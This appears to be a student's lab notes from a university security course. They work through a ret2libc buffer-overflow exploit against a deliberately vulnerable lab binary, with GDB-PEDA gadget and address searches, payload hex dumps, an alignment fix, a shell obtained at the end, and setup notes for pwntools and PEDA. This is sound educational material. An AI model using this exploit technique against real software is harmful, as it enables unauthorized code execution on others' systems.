https://ocw.cs.pub.ro
https://ocw.cs.pub.ro/courses/cns/labs/lab-08
https://github.com/systems-cs-pub-ro/cns

gcc ret2libc.c -o rlibc
pwn checksec ./rlibc
    Stack:    Canary found
# indeed, we find canary code:
objdump --disassemble --disassembler-options=intel ./rlibc
  ...
  mov    rax,QWORD PTR fs:0x28
gcc ret2libc.c -fno-stack-protector -o rlibc
pwn checksec ./rlibc
    Stack:    No canary found

gdb-peda$ p system
$2 = {int (const char *)} 0x7ffff7c50d70 <__libc_system>
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc.so.6 : 0x7ffff7dd8678 --> 0x68732f6e69622f ('/bin/sh')

string "/bin/sh" is in memory, and so is function system()
sketch vuln()'s frame:

-------- <- RBP-0x80 <- RSP

-------- <- new RBP
old RBP
--------
&main+?
--------

it's too easy: the buf[128] is exactly the aligned/optimized size for the generated code
system() expects string in RDI (sysv calling convention), so need gadget to get stack value in RDI

gdb-peda$ ropsearch "pop rdi"
Searching for ROP gadget: 'pop rdi' in: binary ranges
Not found

What to do? The tutorial claims to find a 'pop rdi; ret' in the compiled program itself:
> gdb-peda$ ropsearch "pop rdi"
> Searching for ROP gadget: 'pop rdi' in: binary ranges
> 0x004011e3 : (b'5fc3')  pop rdi; ret
load lab-included, compiled binary, look to 0x4011e3:
  00000000004011b0 <__libc_csu_init>:
    ...
    4011e1:       48 c1 fd 03             sar    rbp,0x3
    4011e5:       74 1f                   je     401206 <__libc_csu_init+0x56>
bullshit, bytes are 0xfd 0x03
load lab-included, compiled binary in gdb and perform search ourselves:
gdb-peda$ ropsearch "pop rdi"
Searching for ROP gadget: 'pop rdi' in: binary ranges
0x00401213 : (b'5fc3')	pop rdi; ret
disassemble again, trying to find this elusive fucking gadget:
  00000000004011b0 <__libc_csu_init>:
    ...
    401212:       41 5f                   pop    r15
    401214:       c3                      ret
the "pop rdi; ret" comes from entering a byte into the "pop r15; ret" sequence at the end of __libc_csu_init()
Compiling with their Makefile does not generate a binary with __libc_csu_init() and fails to contain the gadget!
https://www.gnu.org/software/hurd/glibc/startup.html
https://sourceware.org/git/?p=glibc.git
https://sourceware.org/git/?p=glibc.git;a=tree;f=csu
The function was originally in elf-init.c, but current glibc doesn't have that file:

So semi-rip the function (extra.s) and compile it in (Makefile).

ropsearch "pop rdi"
find "/bin/sh"
p system

00005555555551eb gadget
00007ffff7dd8678 addr of "/bin/sh"
00007ffff7c50d70 addr of __libc_system

xxd -g 8 -e payload.bin
00000000: aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa  ................
...
00000070: aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa  ................
00000080: bbbbbbbbbbbbbbbb 00005555555551eb  .........QUUUU..
00000090: 00007ffff7dd8678 00007ffff7c50d70  x.......p.......

./rlibc < payload.bin
Segmentation fault (core dumped)

Under GDB, fault is at:
0x7ffff7c50973 <do_system+115>:	movaps XMMWORD PTR [rsp],xmm1

Thanks to brilliant Q&A by shaqed, we learn this an alignment issue:
https://stackoverflow.com/questions/54393105/libcs-system-when-the-stack-pointer-is-not-16-padded-causes-segmentation-faul

To bump RSP by 8, to align, we can add a nop gadget, and bounce to a ret, the one after pop rdi.

00005555555551ec "ret"
00005555555551eb "pop rdi; ret"
00007ffff7dd8678 addr of "/bin/sh"
00007ffff7c50d70 addr of __libc_system
00007ffff7c455f0 addr of __GI_exit

$ xxd -g 8 -e ./payload.bin
00000000: aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa  ................
...
00000070: aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaa  ................
00000080: bbbbbbbbbbbbbbbb 00005555555551ec  .........QUUUU..
00000090: 00005555555551eb 00007ffff7dd8678  .QUUU...x.......
000000a0: 00007ffff7c50d70 00007ffff7c455f0  p........U......

./rlibc < payload.bin
(nothing, exit() called?)

I think the forked process that executes "/bin/sh" inherits stdin, which comes from file and is closed, thus we can't interact with the shell.

dup(1, 0) will close 0 if open (it's currently open to payload.bin) and make it describe the file 1 describes.
Since 1 describes the same pts as 0 upon startup (see test-fds.c), this restores its connection.

See gen-payload.sh for commented payload generation.

./rlibc < payload.bin
$ whoami
andrewl
$ ls
extra.o  Makefile     gen-payload.sh	      README.txt  ret2libc.o  test-fds.c
extra.s  payload.bin  peda-session-rlibc.txt  ret2libc.c  rlibc

======== EXPLOIT DOESN'T WORK ========

Ensure the overflow is aligned, RBP should get bb's:

=== GDB post-mortem:
./rlibc < payload.bin
Segmentation fault (core dumped)
gdb ./rlibc $(ls -dtr /var/lib/apport/coredump/* | tail -n 1
(gdb) info r
...
rbp            0xbbbbbbbbbbbbbbbb  0xbbbbbbbbbbbbbbbb

=== GDB with redirection:
gdb rlibc
(gdb) run rlibc < payload.bin

=== strace with redirection:
strace sh -c "./rlibc < payload.bin"

======== PWNTOOLS ========

trying to learn a little pwntools

pip install pwntools
pip show pwntools
# tools like 'checksec' went to ~/.local/bin
# library went to ~/.local/lib/python3.10/site-packages/pwn
#            and ~/.local/lib/python3.10/site-packages/pwnlib
checksec
pwn checksec

# verify it really works
gcc rop1a.c -o rop1a
checksec ./rop1a
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
gcc rop1a.c -fno-stack-protector -o rop1a
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

======== Python Exploit Development Assistance (PEDA) ========

# can be installed and used clean and isolated, won't pollute:
cd ~/repos/unsorted
git clone https://github.com/longld/peda.git
gdb -n # don't execute .gdbinit (where my existing scripts my interfere)
(gdb) source ~/repos/unsorted/peda/peda.git
gdb-peda$ # list available commands:
gdb-peda$ peda help
gdb-peda$ # wow, automatically goes to main:
gdb-peda$ start
gdb-peda$ dumprop
gdb-peda$ ropgadget
gdb-peda$ ropsearch

rop gadgets end with ret
objdump isn't suitable for finding gadgets because everything is asligned, and useful ret opcodes might exist mid-instruction

